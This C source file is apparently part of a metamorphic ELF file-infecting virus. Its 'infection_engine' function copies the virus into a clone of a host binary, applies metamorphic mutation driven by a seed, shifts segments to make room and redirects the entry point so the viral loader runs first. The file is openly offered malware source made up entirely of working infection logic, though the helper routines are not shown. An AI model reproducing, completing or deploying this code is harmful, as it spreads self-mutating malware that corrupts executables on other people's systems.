#include "virus.h"
#include "utils.h"
#include "compiler_utils.h"
#include "errors.h"

static bool	define_shift_amount(const struct entry *file_entry,
			size_t *shift_amount, size_t full_virus_size)
{
	const size_t	p_align = file_entry->safe_phdr->p_align;

	// shift_amount aligned to Elf64 segments alignement requirements
	*shift_amount = ALIGN(full_virus_size, p_align);
	return true;
}

static bool	define_clone_entry(struct entry *clone_entry, struct entry file_entry,
			size_t shift_amount)
{
	*clone_entry = file_entry;
	clone_entry->entry_offset += shift_amount;
	clone_entry->entry_addr += shift_amount;
	return true;
}

bool		infection_engine(struct virus_header *vhdr,
			struct safe_ptr file_ref, struct safe_ptr clone_ref,
			size_t *shift_amount)
{
	struct entry	file_entry;                                             // init by <find_entry>
	struct entry	clone_entry;                                            // init by <define_clone_entry>
	const size_t	*loader_offset   = &file_entry.payload_offset;          // init by <find_entry>
	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>

	if (!find_entry(&file_entry, file_ref)
	|| !not_infected(&file_entry, file_ref)
	|| !copy_virus_to_clone(clone_ref, *loader_offset, vhdr)
	|| !generate_seed(seed, file_ref)
	|| !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
	|| !copy_client_to_clone(clone_ref, file_ref, *loader_offset, *shift_amount)
	|| !define_clone_entry(&clone_entry, file_entry, *shift_amount)
	|| !adjust_references(clone_ref, clone_entry, *shift_amount)
	|| !setup_virus_header(clone_ref, *loader_offset, *vhdr)
	|| !change_entry(clone_ref, &clone_entry, vhdr->dist_jmpclient_loader))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_INFECTION_ENGINE);

	return true;
}
